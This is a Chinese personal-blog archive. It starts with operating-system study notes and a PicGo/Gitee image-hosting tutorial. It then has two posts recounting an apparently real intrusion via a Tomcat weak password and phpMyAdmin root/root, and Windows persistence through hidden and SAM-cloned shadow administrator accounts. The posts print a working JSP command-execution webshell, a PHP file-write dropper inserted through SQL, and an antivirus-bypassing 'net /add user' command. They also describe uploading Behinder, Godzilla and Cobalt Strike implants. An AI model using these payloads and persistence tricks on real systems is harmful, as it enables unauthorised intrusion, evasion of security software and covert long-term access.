<li>链接阶段<ul>
<li>由链接程序将编译后形成的一组目标模块及所需的库函数链接在一起，形成一个完整的装入模块。生成可执行文件（形成逻辑地址）</li>
</ul>
</li>
<li>装入阶段<ul>
<li>由装入程序将装入模块装入内存运行</li>
</ul>
</li>
<li>运行阶段<ul>
<li>得到结果</li>
</ul>
</li>
</ul>
</li>
<li>相关概念<ul>
<li>程序的装入<ul>
<li>绝对装入（逻辑地址必须和实际的内存地址完全一样）</li>
<li>静态重定位（地址变换在装入时一次完成）</li>
<li>动态重定位（地址变换在执行程序的时候再完成）</li>
</ul>
</li>
<li>程序的链接<ul>
<li>静态链接</li>
<li>程序的链接</li>
<li>运行时链接</li>
</ul>
</li>
<li>地址空间<ul>
<li>逻辑地址空间（地址空间从0开始）</li>
<li>物理地址空间（内存中物理单元的集合）</li>
</ul>
</li>
</ul>
</li>
<li>管理方式<ul>
<li>连续分配管理方式（物理地址连续）<ul>
<li>单一连续分配（分配到内存固定的区域——有内部碎片）</li>
<li>固定分区分配（分配到内存不同的固定区域，分区可以相等可以不等——内部碎片）</li>
<li>动态分区分配<ul>
<li>可变分区存储管理：按照程序的需要进行动态的划分</li>
<li>动态分区的分配策略算法<ul>
<li>首次适应（最好）<ul>
<li>空闲分区以<strong>地址递增次数链接</strong>。分配内存时按<strong>顺序查找</strong>，找到大小能满足要求的第一个空闲分区（<strong>增大查找开销</strong>）</li>
</ul>
</li>
<li>最佳适应<ul>
<li>空闲分区按<strong>容量递增的方式</strong>形成成分区链，找到第一个能满足要求的空闲分区（<strong>外部碎片过多</strong>）</li>
</ul>
</li>
<li>最坏适应<ul>
<li>空闲分区按<strong>容量递减的方式</strong>形成成分区链，找到第一个能满足要求的空闲分区，即挑选出最大的分区（<strong>对大进程不利</strong>）</li>
</ul>
</li>
<li>邻近适应<ul>
<li>由首次适应算法演变而成。不同之处是，分匹配内存时从上次<strong>查找结束的位置开始</strong>继续查找</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>非连续分配管理方式（物理地址不连续，一般是一段连续，一段不连续）<ul>
<li><strong>基于分页式存储管理</strong></li>
<li>基本分段式存储管理</li>
<li>段页式</li>
</ul>
</li>
</ul>
</li>
<li>内存扩充<ul>
<li>覆盖（同一程序或进程中）</li>
<li>交换（不同进程/作业之间进行）</li>
<li>虚拟内存<ul>
<li>引入原因——在逻辑上扩充内存</li>
<li>组成部分<ul>
<li>页表机制</li>
<li>中断机制</li>
<li>地址变换机制</li>
<li>内存与外存</li>
</ul>
</li>
<li><strong>页面淘汰（置换）算法</strong>：<ul>
<li><strong>先进先出页面淘汰（置换）算法（FIFO）</strong></li>
<li>最近最久未用页面淘汰（置换）算法（LRU）</li>
<li>最近最少用页面淘汰（置换）算法（clock）</li>
<li>最优（最佳）页面淘汰（置换）算法（OPT）<ul>
<li>把以后不再使用的或最长时间内不会用到的页面淘汰出去（理论上，不会实现）</li>
</ul>
</li>
<li>注意：页面淘汰是由缺页中断引起的，但缺页中断不见得一定引起页面淘汰</li>
</ul>
</li>
<li>抖动<ul>
<li>页面频繁的换进换出</li>
<li>原因<ul>
<li><strong>分配给进程的进程块不足</strong></li>
</ul>
</li>
</ul>
</li>
<li>页面分配的策略<ul>
<li>固定分区局部置换（物理块不变）</li>
<li>可变分区全局置换（动态增加物理块）</li>
<li>可变分区局部置换（只允许从该进程的内存页面中挑选一页）</li>
</ul>
</li>
<li><img src="https://gylq.gitee.io/linkimage/img1/image-20211221194855485.png" alt="image-20211221194855485"></li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="第四章"><a href="#第四章" class="headerlink" title="第四章"></a>第四章</h2><ul>
<li>文件、文件 系统<ul>
<li>概念<ul>
<li>文件是以计算机硬盘为载体的存储在计算机上的信息集合</li>
<li><strong>文件系统</strong>：就是操作系统中负责操纵和管理文件的一套设施，实现了文件共享和保护，方便用户“<strong>按名存取（基本目标）</strong>，<strong>提高文件的存取速度（最重要目标）</strong>”</li>
</ul>
</li>
<li>功能<ul>
<li>文件管理、目录管理、文件空间管理、文件共享和保护、提供方便的接口</li>
</ul>
</li>
</ul>
</li>
<li>文件的逻辑结构<ul>
<li>无结构文件（流式文件）</li>
<li>有结构文件（记录式文件）<ul>
<li>顺序文件——磁带上一定是存储的顺序文件</li>
<li>索引文件</li>
<li>索引顺序文件</li>
</ul>
</li>
</ul>
</li>
<li>目录和目录结构<ul>
<li>文件控制块<ul>
<li>在文件系统内部给每个文件唯一地设置一个文件控制块，它用于描述和控制文件的数据结构，与文件一一对应</li>
</ul>
</li>
<li>目录结构<ul>
<li>单级目录（不允许重名）</li>
<li>二级目录（解决了重名问题）<ul>
<li>主文件目录</li>
<li>用户文件目录 </li>
</ul>
</li>
<li>树形目录优<ul>
<li>优：方便</li>
<li>缺：不便共享<ul>
<li>绝对路径（从根目录出发）</li>
<li>相对路径（从当前目录出发）</li>
</ul>
</li>
</ul>
</li>
<li>图形目录（实现了共享）</li>
</ul>
</li>
</ul>
</li>
<li>文件实现<ul>
<li>文件分配方式<ul>
<li>连续分配（有外部碎片，可以直接访问）</li>
<li>链接分配（解决了外部碎片，但是不支持直接访问，数据易丢失）</li>
<li>索引分配（加入FAT表可直接访问，减少了访问磁盘的次数）</li>
</ul>
</li>
<li><strong>文件存储空间管理</strong><ul>
<li>空闲表法</li>
<li>空闲链表法</li>
<li>位示图法</li>
</ul>
</li>
</ul>
</li>
<li>磁盘管理<ul>
<li>磁盘地址结构<ul>
<li>柱面号、盘面号、扇面号</li>
</ul>
</li>
<li>磁盘调度算法<ul>
<li>先到先服务算法（FCFS） </li>
<li>最短查找时间优先算法（SSTF）</li>
<li>扫描算法和LOOK算法（避免了饥饿算法）</li>
<li>循环扫描算法和循环LOOK算法</li>
</ul>
</li>
<li><img src="https://gylq.gitee.io/linkimage/img1/image-20211221204033854.png" alt="image-20211221204033854"></li>
</ul>
</li>
</ul>
<h2 id="第五章-设备管理"><a href="#第五章-设备管理" class="headerlink" title="第五章 设备管理"></a>第五章 设备管理</h2><ul>
<li>设备管理的目标<ul>
<li>使用方便、与设备无关、效率高、管理统一。</li>
</ul>
</li>
<li>I/O设备<ul>
<li>分类<ul>
<li>存储设备或输入输出设备</li>
<li>块设备或字符设备</li>
<li>低速中速告诉设备</li>
</ul>
</li>
<li>I/O控制方式<ul>
<li>①程序直接控制</li>
<li>方式<ul>
<li>这种方式也可以称为查询方式，CPU不断地去查询设备控制器是否将数据放到了数据存储器中，或者从数据存储器存到设备中，当完成IO时CPU才能去干别的事。——以字为数据传输单元，cpu利用率低</li>
</ul>
</li>
<li>②中断方式：<ul>
<li>cpu发出指令后就可以去干别的事，当设备控制器把数据存在数据存储器后，向cpu发出中断请求，然后cpu再来处理这部分数据</li>
</ul>
</li>
<li>③DMA方式<ul>
<li>解决了中断方式提高了cpu利用率，但是数据寄存器有限，介于i/o和主存之间。</li>
</ul>
</li>
<li>④IO通道控制方式：<ul>
<li>DMA虽然大大地提升了cpu的利用率，但是DMA只能传输一个连续的数据块。所以引入了IO通道的控制方式，IO通道控制方式可以传输不连续的数据块，减少了CPU干预。CPU通过对IP通道发出指令，然后让IO通道自己工作，等数据传输完才向CPU发起中断。</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>引入缓冲的目的和缓冲区的设置方式<ul>
<li>1、引入缓冲区的目的<ul>
<li>缓和CPU与外设间速度不匹配的矛盾</li>
<li>提高CPU与外设之间的并行性</li>
<li>减少对CPU的中断次数</li>
<li>磁盘的高速缓存——在内存中单独开辟一个空间，作为磁盘的高速缓冲</li>
<li>以空闲的区域作磁盘的高速缓冲区</li>
</ul>
</li>
<li>2、缓冲区的设置方式<ul>
<li>单缓冲：当数据到达率与离去率相差很大时，可采用单缓冲方式——设备和处理机之间</li>
<li>双缓冲：必须等缓冲区满</li>
<li><strong>循环缓冲区</strong><ul>
<li><strong>1、空缓冲队列</strong></li>
<li><strong>2、输入队列</strong></li>
<li><strong>3、输出队列</strong></li>
</ul>
</li>
<li><strong>四个缓冲区</strong><ul>
<li><strong>收容输入数据的工作缓冲区</strong></li>
<li><strong>提取输入数据的工作缓冲区</strong></li>
<li><strong>收容输出的工作缓冲区</strong></li>
<li><strong>提取输出数据的工作缓冲区</strong></li>
</ul>
</li>
<li>多缓冲</li>
</ul>
</li>
</ul>
</li>
<li>常用设备分配技术<ul>
<li>1、根据设备的使用性质<ul>
<li>独占设备<ul>
<li>不能共享的设备</li>
</ul>
</li>
<li>共享设备<ul>
<li>可由若干个进程同时共享的设备。如磁盘机</li>
</ul>
</li>
<li>虚拟设备<ul>
<li>是利用某些技术把独占设备改造成可由多个进程共享的设备</li>
</ul>
</li>
</ul>
</li>
<li>对三种设备采用三种分配技术<ul>
<li>独占分配技术</li>
<li>共享分配技术</li>
<li><strong>虚拟分配技术</strong><ul>
<li>利用共享设备去模拟独占设备，从而使独占设备成为可共享的、快熟I/O的设备，实现虚拟分配的最有名的技术是SPOOLing技术，称为假脱机操作</li>
<li><strong>分配因素</strong><ul>
<li><strong>固有性质</strong></li>
<li><strong>I/O设备分配算法</strong></li>
<li><strong>I/O设备安全性</strong></li>
<li><strong>I/O设备独立性</strong></li>
</ul>
</li>
<li>什么是设备的独立性<ul>
<li>应用程序独立于具体使用的物理设备</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title>【知识积累】typora自动上传图片网链方法</title>
    <url>/posts/178.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<ul>
<li><h5 id="markdown是一门易于上手能帮助作者专心写作的文档编辑语言，它的好处太多了，建议想自己动手做笔记写博客的朋友都可以学一学，10分钟上手（我昨天晚上还不会用，今天就开始用它写博客了。。足以证明它是真的很简单）"><a href="#markdown是一门易于上手能帮助作者专心写作的文档编辑语言，它的好处太多了，建议想自己动手做笔记写博客的朋友都可以学一学，10分钟上手（我昨天晚上还不会用，今天就开始用它写博客了。。足以证明它是真的很简单）" class="headerlink" title="markdown是一门易于上手能帮助作者专心写作的文档编辑语言，它的好处太多了，建议想自己动手做笔记写博客的朋友都可以学一学，10分钟上手（我昨天晚上还不会用，今天就开始用它写博客了。。足以证明它是真的很简单）"></a><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fbaike.baidu.com%2Fitem%2Fmarkdown%2F3245829%3Ffr%3Daladdin" target="_blank" rel="noopener">markdown</a>是一门易于上手能帮助作者专心写作的文档编辑语言，它的好处太多了，建议想自己动手做笔记写博客的朋友都可以学一学，10分钟上手（我昨天晚上还不会用，今天就开始用它写博客了。。足以证明它是真的很简单）</h5><h5 id="Tpyora是一款优雅的markdown编辑器，也推荐给大家，至于安装和配置，比安装word还简单，就不赘述了"><a href="#Tpyora是一款优雅的markdown编辑器，也推荐给大家，至于安装和配置，比安装word还简单，就不赘述了" class="headerlink" title="Tpyora是一款优雅的markdown编辑器，也推荐给大家，至于安装和配置，比安装word还简单，就不赘述了"></a><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.typora.io%2F" target="_blank" rel="noopener">Tpyora</a>是一款优雅的markdown编辑器，也推荐给大家，至于安装和配置，比安装word还简单，就不赘述了</h5></li>
<li><p>博客文章如果上传，一般都要上传网链，所以为了方便我们写文章，所以出一篇typora的自动上传gitee仓库图床方法。</p>
</li>
</ul>
</blockquote>
<p>最终决定PicGo+Gitee来实现markdown图床</p>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><ul>
<li>PicGo：<a href="https://github.com/Molunerfinn/PicGo" target="_blank" rel="noopener">https://github.com/Molunerfinn/PicGo</a></li>
</ul>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211127123603064.png" alt=""></p>
</blockquote>
<ul>
<li><strong>picgo-plugin-gitee-uploader插件,安装好</strong></li>
</ul>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211127123642898.png" alt=""></p>
</blockquote>
<h2 id="2-建立gitee（码云）图床库"><a href="#2-建立gitee（码云）图床库" class="headerlink" title="2. 建立gitee（码云）图床库"></a>2. 建立gitee（码云）图床库</h2><p>注册码云的方法很简单，网站引导都是中文，不多说了，我们直接建立自己的图床库。</p>
<h3 id="点击右上角的-号，新建仓库"><a href="#点击右上角的-号，新建仓库" class="headerlink" title="点击右上角的+号，新建仓库"></a>点击右上角的+号，新建仓库</h3><p><img src="https://gylq.gitee.io/linkimage/img1/v2-44a4581b8e0ac9a0bc6747ee9b507a0e_1440w.jpg" alt=""></p>
<p>新建仓库的要点如下：</p>
<ol>
<li>输入一个仓库名称</li>
<li>其次将仓库设为公开</li>
<li>勾选使用Readme文件初始化这个仓库</li>
</ol>
<p><strong>这个选项勾上，这样码云会自动给你的仓库建立master分支，这点很重要!!!</strong> 我因为这点折腾了很久，因为使用github做图床picgo好像会自动帮你生成master分支，而picgo里的gitee插件不会帮你自动生成分支。</p>
<p><img src="https://gylq.gitee.io/linkimage/img1/v2-11790828fe9ce436ea6d92fbe1c0662f_1440w.jpg" alt=""></p>
<p>点击创建进入下一步</p>
<hr>
<h2 id="3-配置PicGo"><a href="#3-配置PicGo" class="headerlink" title="3. 配置PicGo"></a>3. 配置PicGo</h2><p>安装了<strong>gitee-uploader 1.1.2</strong>插件之后，我们开始配置插件</p>
<h3 id="配置插件的要点如下："><a href="#配置插件的要点如下：" class="headerlink" title="配置插件的要点如下："></a>配置插件的要点如下：</h3><p><img src="https://gylq.gitee.io/linkimage/img1/v2-7fd17e45105b65c13c9c7e260a5b6d87_1440w.jpg" alt=""></p>
<ul>
<li>repo：用户名/仓库名称，比如我自己的仓库leonG7/blogImage，找不到的可以直接复制仓库的url</li>
</ul>
<p><img src="https://gylq.gitee.io/linkimage/img1/v2-c0bc93a55fc118fb9731371af0c8a702_1440w.png" alt=""></p>
<ul>
<li>branch：分支，这里写上master</li>
<li>token：填入码云的<a href="https://www.zhihu.com/search?q=私人令牌&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra={" target="_blank" rel="noopener"sourceType"%3A"article"%2C"sourceId"%3A102594554}">私人令牌</a></li>
<li>path：路径，一般写上img</li>
<li>customPath：提交消息，这一项和下一项customURL都不用填。在提交到码云后，会显示提交消息，插件默认提交的是 <code>Upload 图片名 by picGo - 时间</code></li>
</ul>
<h3 id="这个token怎么获取，下面登录进自己的码云"><a href="#这个token怎么获取，下面登录进自己的码云" class="headerlink" title="这个token怎么获取，下面登录进自己的码云"></a>这个token怎么获取，下面登录进自己的码云</h3><ol>
<li>点击头像，进入设置</li>
</ol>
<p><img src="https://gylq.gitee.io/linkimage/img1/v2-09207edcefff7852c91abcc3df3c5ba0_1440w.png" alt=""></p>
<ol>
<li>找到右边安全设置里面的私人令牌</li>
</ol>
<p><img src="https://gylq.gitee.io/linkimage/img1/v2-bc612193330f4235b8c887dc95a77f68_1440w.jpg" alt=""></p>
<ol>
<li>点击<code>生成新令牌</code>，把<strong>projects</strong>这一项勾上，其他的不用勾，然后提交</li>
</ol>
<p><img src="https://gylq.gitee.io/linkimage/img1/v2-9d8ba0adb98d509d3de8c1b615c68353_1440w.jpg" alt=""></p>
<p>这里需要验证一下密码，验证密码之后会出来一串数字，这一串数字就是你的token，将这串数字复制到刚才的配置里面去。</p>
<p><img src="https://gylq.gitee.io/linkimage/img1/v2-7d9e998d82ae965fe7f1ddd93d59d48a_1440w.jpg" alt=""></p>
<blockquote>
<p>注意：这个令牌只会明文显示一次，建议在配置插件的时候再来生成令牌，直接复制进去，搞丢了又要重新生成一个。</p>
</blockquote>
<h3 id="现在保存你刚才的配置，然后将它设置为默认图床，大功告成。"><a href="#现在保存你刚才的配置，然后将它设置为默认图床，大功告成。" class="headerlink" title="现在保存你刚才的配置，然后将它设置为默认图床，大功告成。"></a>现在保存你刚才的配置，然后将它设置为默认图床，大功告成。</h3><p>还有一个插件<strong>gitee 1.2.2-beta</strong>，功能差不多，<code>刚才那个能用的话就不需要用这个</code>，配置的内容有点差别，简单说一下：</p>
<p><img src="https://gylq.gitee.io/linkimage/img1/v2-499cfcbda9cbd6c4f5c8e23f30e382cc_1440w.jpg" alt=""></p>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a><a href="http://gylq.gitee.io">我的个人博客</a></h1><blockquote>
<h2 id="孤桜懶契：http-gylq-gitee-io"><a href="#孤桜懶契：http-gylq-gitee-io" class="headerlink" title="孤桜懶契：http://gylq.gitee.io"></a>孤桜懶契：<a href="http://gylq.gitee.io">http://gylq.gitee.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>知识积累</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>【知识积累】遇到Tomcat和phpmyadmin的一次渗透</title>
    <url>/posts/177.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<ul>
<li>简单的渗透测试</li>
</ul>
</blockquote>
<h1 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h1><p>简单的看一下信息，发现ThinkPHP</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211109190905262.png" alt=""></p>
</blockquote>
<p>看一看版本，3.2.3，百度搜了下，好像是可以反序列化注入，先放着，再搜集一下信息</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211109191105710.png" alt=""></p>
</blockquote>
<p><strong>把图片路径去掉，会发现个目录遍历，还没想到利用方式，没找到admin目录，信息越多突破口才更好找</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211109191256676.png" alt=""></p>
</blockquote>
<p>再用nmapAutomator扫一波网站的端口信息，不错，开了3306，还有tomcat</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211109191636470.png" alt=""></p>
</blockquote>
<p>直接去tomcat，常规的测试一下put，有可能开了readonly，但是没有，不允许</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211109194306695.png" alt=""></p>
</blockquote>
<h1 id="Tomcat弱口令"><a href="#Tomcat弱口令" class="headerlink" title="Tomcat弱口令"></a>Tomcat弱口令</h1><p>然后弱密码，登陆试试，惊喜，进了。可以直接war打包getshell了</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211109194358491.png" alt=""></p>
</blockquote>
<p>其实这时还有个，就是上面指纹识别的多了一些信息，因为之前不是检测端口开放了3306吗，没想到tomcat上面会识别到<code>phpmyadmin</code>管理数据库，之前用网站目录没扫出来，估计域名访问的是ip:80/xx/index.php，所以现在直接用ip:8080访问就扫出来了吧，这时能拿shell的方法又有其他的可以尝试。</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211109194511542.png" alt=""></p>
</blockquote>
<p>先试试这个了，先添加一个一句话木马</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;% if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123; java.io.InputStream in &#x3D; Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream(); int a &#x3D; -1; byte[] b &#x3D; new byte[2048]; out.print(&quot;&lt;pre&gt;&quot;); while((a&#x3D;in.read(b))!&#x3D;-1)&#123; out.println(new String(b)); &#125; out.print(&quot;&lt;&#x2F;pre&gt;&quot;); &#125; %&gt;</span><br></pre></td></tr></table></figure></div>

<p>用jar打个包，简单理解一下 c是create，v是详细的意思不知道啥单词，f是file指定创建的war</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211109194944107.png" alt=""></p>
</blockquote>
<p>接着上传就ok了</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211109194959899.png" alt=""></p>
</blockquote>
<p>他会把cmd.war解压成cmd/1.jsp，我们访问这个路径就可以看到了</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211109202023781.png" alt=""></p>
</blockquote>
<p>高权限，随即我执行命令，发现被拦截了，看了看进程，发现360</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211109195240225.png" alt=""></p>
</blockquote>
<p>接着网上搜了个大马，试试能不能绕过，同样方法，上传大马，确实有个360</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211109200000439.png" alt=""></p>
</blockquote>
<p>上传cs免杀马，结果自己做的太大了，算了，上传哥斯拉马，哥斯拉搞起</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211109201834732.png" alt=""></p>
</blockquote>
<p>想上传cs马，结果没权限，因为没法上传文件</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211109202345324.png" alt=""></p>
</blockquote>
<h1 id="过360创建用户"><a href="#过360创建用户" class="headerlink" title="过360创建用户"></a>过360创建用户</h1><p>这里写一个自己构造的bypass360创建用户的方法，可以进去人工关360</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">正常来写 </span><br><span class="line">net user test$ Redteam123 &#x2F;add 这样肯定会被360拦截，但是换一个写法</span><br><span class="line"></span><br><span class="line">改写之后</span><br><span class="line">net &#x2F;add user test$ Redteam123  这样就能成功创建用户，亲测可以绕过360和火绒创建用户</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211109202619497.png" alt=""></p>
</blockquote>
<h1 id="PHPmyadmin方法记录"><a href="#PHPmyadmin方法记录" class="headerlink" title="PHPmyadmin方法记录"></a>PHPmyadmin方法记录</h1><p><strong>这里回到网站，另一种方法也记录一下，好久没碰phpmyadmin，在tomcat中检查指纹的时候，爆出有phpmyadmin，我们访问看看，我还想着是不是要利用刚刚拿到的shell去找mysql密码，结果root root就进去了。弱密码tql</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211109203755330.png" alt=""></p>
</blockquote>
<p><strong>还是基础操作，日志getshell，简单的猜一下目录</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211109205128023.png" alt=""></p>
</blockquote>
<p>但是访问不进去</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211109210155100.png" alt=""></p>
</blockquote>
<p>我怀疑是被杀了，上传个冰蝎马，思路是利用file_put_contents来post传上去</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">SELECT &quot;&lt;?php file_put_contents($_GET[&#39;name&#39;],$_POST[&#39;ma&#39;]);?&gt;&quot;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211109205907123.png" alt=""></p>
</blockquote>
<p><strong>然后发现可以访问了，接着利用这个写入要url编码一下冰蝎马，或者哥斯拉马，这里用冰蝎了</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211109210230894.png" alt=""></p>
</blockquote>
<p>成功连上冰蝎</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211109210107859.png" alt=""></p>
</blockquote>
<p><strong>这次继续上cs马，没想到上去了，我做了个木马，太大了2Mo(╥﹏╥)o，太菜了</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211109211319063.png" alt=""></p>
</blockquote>
<p><strong>接着执行一下就上线了</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211109211556127.png" alt=""></p>
</blockquote>
<p>结束</p>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a><a href="http://gylq.gitee.io">我的个人博客</a></h1><blockquote>
<h2 id="孤桜懶契：http-gylq-gitee-io"><a href="#孤桜懶契：http-gylq-gitee-io" class="headerlink" title="孤桜懶契：http://gylq.gitee.io"></a>孤桜懶契：<a href="http://gylq.gitee.io">http://gylq.gitee.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>知识积累</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>【知识积累】win下权限维持+留后门</title>
    <url>/posts/176.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<ul>
<li>大晚上的，最近也积累知识一些拿机子该如何不让机子挂掉呢，马不一定能保证你不会挂掉（免杀也许可以）但我还太菜，先来个windows下的一些技巧吧，实战还是很有意义的，可以让对方很难找到你的后门</li>
</ul>
</blockquote>
<h1 id="第一阶段-隐藏用户"><a href="#第一阶段-隐藏用户" class="headerlink" title="第一阶段-隐藏用户"></a>第一阶段-隐藏用户</h1><p><strong>我拿实战做个案例，这个我感觉大家可能都知道，但是还是说一下，隐藏用户指的是无法单纯从net user中看到的用户，也就是说用户名加上一个$</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">net user admin$ ***** /add #比如这样的</span><br><span class="line">net localgroup administrators administrator$ ***** /add #比如这样的</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211031164039039.png" alt="image-20211031164039039"></p>
</blockquote>
<p><strong>这样就能达到初步的隐藏  只是无法用net user查看</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211031164128981.png" alt="image-20211031164128981"></p>
</blockquote>
<p><strong>但是当我们打开控制面板的用户中却可以查看到我们创建的隐藏用户</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211031164505158.png" alt="image-20211031164505158"></p>
</blockquote>
<h1 id="第二阶段-超管影子用户"><a href="#第二阶段-超管影子用户" class="headerlink" title="第二阶段-超管影子用户"></a>第二阶段-超管影子用户</h1><p><strong>提示：因为前面我们就创建过一个<code>administrator$</code>隐藏用户</strong></p>
<p>这是我们该想办法让他更隐匿一些，这时我们拿出注册表修改sam</p>
<p>路径如下</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">计算机\HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\administrator$</span><br></pre></td></tr></table></figure></div>

<p><strong>1、分别命名为 1（administrator$）和 2（0x3e）导出</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211031165500473.png" alt="image-20211031165500473"></p>
</blockquote>
<p><strong>2、接着桌面就会有1和2</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211031165543375.png" alt="image-20211031165543375"></p>
</blockquote>
<p><strong>3、仿造administrator的影子 导出对应的文件为3</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211031165652887.png" alt="image-20211031165652887"></p>
</blockquote>
<p><strong>4、将文件3和文件2中F对调如下</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211031165907632.png" alt="image-20211031165907632"></p>
</blockquote>
<p><strong>5、接着删除我们先前创建的隐藏用户<code>administrator$</code>,可以查看注册表发现删掉了</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">net user administrator$ &#x2F;del</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211031170135256.png" alt="image-20211031170135256"></p>
</blockquote>
<p><strong>6、打开我们刚刚已经设置好的1和2注册表文件 添加我们的用户</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211031170325405.png" alt="image-20211031170325405"></p>
</blockquote>
<p>7、这时我们可以查看这个用户是否可被修改，无法删除</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211031170414828.png" alt="image-20211031170414828"></p>
</blockquote>
<p>8、这也是最兴奋的，可以通过我们隐藏用户登录administrator用户的桌面</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211031170948090.png" alt="image-20211031170948090"></p>
</blockquote>
